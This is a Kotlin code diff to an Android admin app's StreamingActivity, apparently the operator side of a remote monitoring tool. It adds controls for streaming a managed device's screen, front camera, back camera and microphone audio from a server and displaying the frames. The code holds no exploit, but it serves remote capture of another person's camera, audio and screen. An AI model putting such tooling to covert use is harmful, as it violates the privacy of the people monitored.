@@ -11,6 +11,7 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
 import com.abuzahra.admin.R
 import com.abuzahra.admin.data.api.ApiClient
+import com.abuzahra.admin.data.api.ApiService
 import com.abuzahra.admin.data.model.Device
 import com.abuzahra.admin.databinding.ActivityStreamingBinding
 import com.abuzahra.admin.util.Preferences
@@ -23,6 +24,13 @@ class StreamingActivity : AppCompatActivity() {
 
     private lateinit var binding: ActivityStreamingBinding
     private lateinit var device: Device
+    private lateinit var api: ApiService
+
+    // Server expects these exact stream_type values (see api_handlers.py jpeg_loop):
+    //   "screen"      → cmd = screenshot
+    //   "front_camera" → cmd = front_camera
+    //   "back_camera"  → cmd = back_camera
+    //   "audio"        → cmd = record_audio
     private var streamType = "screen"
     private var intervalMs = 2000L
     private var isStreaming = false
@@ -39,6 +47,9 @@ class StreamingActivity : AppCompatActivity() {
             return
         }
 
+        val prefs = Preferences.getInstance(this)
+        api = ApiClient.createWithToken(prefs.serverUrl, prefs.token ?: "")
+
         setupToolbar()
         setupViews()
     }
@@ -52,28 +63,26 @@ class StreamingActivity : AppCompatActivity() {
     }
 
     private fun setupViews() {
-        // Stream type selector
+        // Stream type selector — 4 chips matching server stream_type values
         binding.chipScreen.isChecked = true
         binding.chipScreen.setOnClickListener {
             streamType = "screen"
-            binding.chipScreen.isChecked = true
-            binding.chipCamera.isChecked = false
-            binding.chipAudio.isChecked = false
+            selectStreamChip(binding.chipScreen)
         }
-        binding.chipCamera.setOnClickListener {
-            streamType = "camera"
-            binding.chipCamera.isChecked = true
-            binding.chipScreen.isChecked = false
-            binding.chipAudio.isChecked = false
+        binding.chipFrontCamera.setOnClickListener {
+            streamType = "front_camera"
+            selectStreamChip(binding.chipFrontCamera)
+        }
+        binding.chipBackCamera.setOnClickListener {
+            streamType = "back_camera"
+            selectStreamChip(binding.chipBackCamera)
         }
         binding.chipAudio.setOnClickListener {
             streamType = "audio"
-            binding.chipAudio.isChecked = true
-            binding.chipScreen.isChecked = false
-            binding.chipCamera.isChecked = false
+            selectStreamChip(binding.chipAudio)
         }
 
-        // Quality selector
+        // Quality selector (interval-based)
         binding.chipQualityHigh.setOnClickListener {
             intervalMs = 500L
             selectQualityChip(binding.chipQualityHigh)
@@ -100,6 +109,12 @@ class StreamingActivity : AppCompatActivity() {
         binding.btnStopStream.isEnabled = false
     }
 
+    private fun selectStreamChip(selected: com.google.android.material.chip.Chip) {
+        listOf(binding.chipScreen, binding.chipFrontCamera, binding.chipBackCamera, binding.chipAudio).forEach {
+            it.isChecked = (it == selected)
+        }
+    }
+
     private fun selectQualityChip(selected: com.google.android.material.chip.Chip) {
         listOf(binding.chipQualityHigh, binding.chipQualityMedium, binding.chipQualityLow).forEach {
             it.isChecked = (it == selected)
@@ -120,12 +135,10 @@ class StreamingActivity : AppCompatActivity() {
 
         lifecycleScope.launch {
             try {
-                val prefs = Preferences.getInstance(this@StreamingActivity)
-                val api = ApiClient.createWithToken(prefs.serverUrl, prefs.token ?: "")
                 api.startJpegStream(device.id, streamType)
 
                 withContext(Dispatchers.Main) {
-                    binding.tvStatus.text = "بث مباشر - $streamType"
+                    binding.tvStatus.text = "بث مباشر - ${streamLabel(streamType)}"
                     binding.progressBar.visibility = View.GONE
                     startFramePolling()
                 }
@@ -141,6 +154,14 @@ class StreamingActivity : AppCompatActivity() {
         }
     }
 
+    private fun streamLabel(type: String): String = when (type) {
+        "screen" -> "بث الشاشة"
+        "front_camera" -> "الكاميرا الأمامية"
+        "back_camera" -> "الكاميرا الخلفية"
+        "audio" -> "بث الصوت"
+        else -> type
+    }
+
     private fun startFramePolling() {
         streamRunnable = Runnable {
             if (!isStreaming) return@Runnable
@@ -148,12 +169,12 @@ class StreamingActivity : AppCompatActivity() {
             val currentRunnable = streamRunnable
             lifecycleScope.launch {
                 try {
-                    val prefs = Preferences.getInstance(this@StreamingActivity)
-                    val api = ApiClient.createWithToken(prefs.serverUrl, prefs.token ?: "")
-                    val response = api.getStreamFrame(device.id, streamType)
+                    // Server stores ALL frames under the key {device_id}:video
+                    // (see api_handlers.py:524, 691, 1421, 1450) — always poll with type=video
+                    val response = api.getStreamFrame(device.id, "video")
 
-                    if (response.ok && response.image.isNotEmpty()) {
-                        val bytes = android.util.Base64.decode(response.image, android.util.Base64.DEFAULT)
+                    if (response.ok && response.data.isNotEmpty()) {
+                        val bytes = android.util.Base64.decode(response.data, android.util.Base64.DEFAULT)
                         val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                         withContext(Dispatchers.Main) {
                             binding.imageView.setImageBitmap(bitmap)
@@ -183,8 +204,6 @@ class StreamingActivity : AppCompatActivity() {
 
         lifecycleScope.launch {
             try {
-                val prefs = Preferences.getInstance(this@StreamingActivity)
-                val api = ApiClient.createWithToken(prefs.serverUrl, prefs.token ?: "")
                 api.stopJpegStream(device.id)
             } catch (_: Exception) {}
         }
